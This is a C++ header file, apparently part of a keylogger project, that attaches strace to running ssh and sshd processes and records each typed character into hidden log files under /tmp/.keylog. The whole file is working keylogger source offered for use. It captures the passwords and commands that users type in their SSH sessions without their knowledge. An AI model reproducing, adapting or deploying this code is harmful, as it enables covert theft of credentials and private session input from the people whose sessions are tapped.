#ifndef KEYLOGGER_STRACE_HPP
#define KEYLOGGER_STRACE_HPP

#include <boost/filesystem.hpp>
#include <boost/regex.hpp>
#include <string>
#include <iostream>
#include "parsing.hpp"
#include "process.hpp"

namespace fs = boost::filesystem;

namespace strace_ns{
    std::string find_key_in_strace_line(const std::string &data_from_strace, boost::regex &xRegEx,      // IS_TESTED
                                        const std::string &sys_call){
        std::string symbol{};
        if (data_from_strace.find(sys_call + "(") != std::string::npos &&
            data_from_strace.find(", 1") != std::string::npos &&
            data_from_strace.find("= 1\n") != std::string::npos)
        {
            symbol = parsing_utils::parse_strace_line(data_from_strace, xRegEx);
        }
        return symbol;
    }

    void ssh_keylogger(const uint16_t& pid){
        DEBUG_STDOUT("Handling process(outgoing SSH) " + std::to_string(pid));
        std::string strace_cmd= "strace -s 16384 -p " + std::to_string(pid) + " -e read 2>&1";
        FILE* pipe = popen(strace_cmd.c_str(), "r");
        if (!pipe)
        {
            DEBUG_STDERR("Couldn't 'strace' command");
            return;
        }
        fs::path log_filename = "/tmp/.keylog";
        log_filename /= std::to_string(pid) + "_ssh.log";
        FILE *fd = std::fopen(log_filename.c_str(), "a+");
        if(!fd){
            DEBUG_STDERR("Log-file error: " + log_filename.string());
            return;
        }
        std::array<char, 256> buffer{};
        while(fgets(buffer.data(), 256, pipe) != nullptr){
            std::string data_from_strace{buffer.data()};
            boost::regex xRegEx("read\\(\\d+, \"(?<cmd>.*)\", 16384\\)\\s+= 1");
            std::string symbol = find_key_in_strace_line(data_from_strace, xRegEx, "read");
            if(!symbol.empty())
                std::fwrite(symbol.data(), 1, symbol.size(), fd);
        }
        DEBUG_STDOUT("Connection is closed from PID = " +  std::to_string(pid));
        HandledProcesses& current_proc_list = HandledProcesses::getInstance();
        current_proc_list.del_from_proc_list(pid);
        pclose(pipe);
        std::fclose(fd);
    }

    void sshd_keylogger(const uint16_t& pid){
        DEBUG_STDOUT("Handling process(incoming SSH) " + std::to_string(pid));
        std::string strace_cmd= "strace -s 16384 -p " + std::to_string(pid) + " -e write 2>&1";
        FILE* pipe = popen(strace_cmd.c_str(), "r");
        if (!pipe)
        {
            DEBUG_STDERR("Couldn't 'strace' command");
            return;
        }
        fs::path log_filename = "/tmp/.keylog";
        log_filename /= std::to_string(pid) + "_sshd.log";
        FILE *fd = std::fopen(log_filename.c_str(), "a+");
        if(!fd){
            DEBUG_STDERR("Log-file error: " + log_filename.string());
            return;
        }
        std::array<char, 256> buffer{};
        while(fgets(buffer.data(), 256, pipe) != nullptr){
            std::string data_from_strace{buffer.data()};
            boost::regex xRegEx("write\\(\\d+, \"(?<cmd>.*)\", 1\\)\\s+= 1");
            std::string symbol = find_key_in_strace_line(data_from_strace, xRegEx, "write");
            if(!symbol.empty())
                std::fwrite(symbol.data(), 1, symbol.size(), fd);
        }
        DEBUG_STDOUT("Connection is closed from PID = " +  std::to_string(pid));
        HandledProcesses& current_proc_list = HandledProcesses::getInstance();
        current_proc_list.del_from_proc_list(pid);
        pclose(pipe);
        std::fclose(fd);
    }
}

#endif //KEYLOGGER_STRACE_HPP
